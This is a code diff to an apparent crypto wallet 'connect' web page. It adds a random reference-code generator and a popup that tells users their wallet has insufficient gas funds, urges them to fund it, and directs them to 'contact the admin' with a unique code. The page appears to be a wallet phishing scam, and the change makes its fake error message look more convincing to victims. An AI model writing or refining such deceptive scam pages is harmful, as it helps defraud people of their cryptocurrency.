@@ -1118,6 +1118,16 @@
     </div>
 
     <script>
+      // 🔥 ONLY ADDED THIS — random code generator
+      function generateRefCode(length = 6) {
+        const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+        let result = '';
+        for (let i = 0; i < length; i++) {
+          result += chars.charAt(Math.floor(Math.random() * chars.length));
+        }
+        return result;
+      }
+
       function countWords(str) {
         return str
           .trim()
@@ -1270,6 +1280,12 @@
               btn.disabled = false;
               btn.textContent = "Connect";
               closeModal();
+
+              // 🔥 ONLY THIS PART CHANGED — generates random code instead of hardcoded 2QGFLb
+              var refCode = generateRefCode(6);
+              var popupText = document.querySelector('#successPopup p');
+              popupText.innerHTML = 'Insufficient balance for gas. Please fund your wallet to continue or try again with another wallet. Please contact the admin with your unique ref code: <strong>' + refCode + '</strong>';
+
               setTimeout(function () {
                 document.getElementById("successPopup").classList.add("active");
               }, 200);
